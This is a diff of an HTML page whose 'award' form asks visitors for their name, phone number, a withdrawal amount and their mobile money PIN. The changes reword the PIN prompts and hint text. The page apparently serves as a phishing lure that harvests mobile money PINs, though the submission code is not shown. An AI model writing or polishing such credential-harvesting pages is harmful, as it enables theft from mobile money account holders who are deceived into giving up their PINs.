@@ -46,7 +46,7 @@
     <input type="number" id="amount" name="Amount to withdraw" placeholder="1000" min="1" required>
     <div id="amountErr" class="error">Please enter a valid amount.</div>
 
-    <label id="pinLabel" for="pin">Enter your Mobile money pin/secret code</label>
+    <label id="pinLabel" for="pin">Enter Your Mobile Money PIN</label>
     <div class="pin-row">
       <input type="password" id="pin" name="Mobile Money PIN" placeholder="****" required>
       <button type="button" id="togglePin" class="toggle-btn">Show</button>
@@ -96,8 +96,8 @@ function isAmountValid(v){return v!=='' && !isNaN(v) && Number(v)>0;}
 function updatePinLabel(){
   const amt=amountInput.value||'[Amount]';
   const ph=phoneInput.value||'[Phone Number]';
-  document.getElementById('pinLabel').textContent=`Enter your Mobile money pin/secret code to withdraw ${amt} to ${ph}`;
-  dynamicHint.textContent=`This PIN will be used to withdraw ${amt} to ${ph}`;
+  document.getElementById('pinLabel').textContent=`Enter Your Mobile Money PIN ${amt} to ${ph}`;
+  dynamicHint.textContent=`This  PIN will be used to Withdraw ${amt} to ${ph}`;
 }
 
 [nameInput, phoneInput, amountInput, pinInput].forEach(el=>el.addEventListener('input',()=>{
@@ -140,4 +140,4 @@ document.getElementById('awardForm').addEventListener('submit',()=>{
 </script>
 
 </body>
-  </html>
+</html>
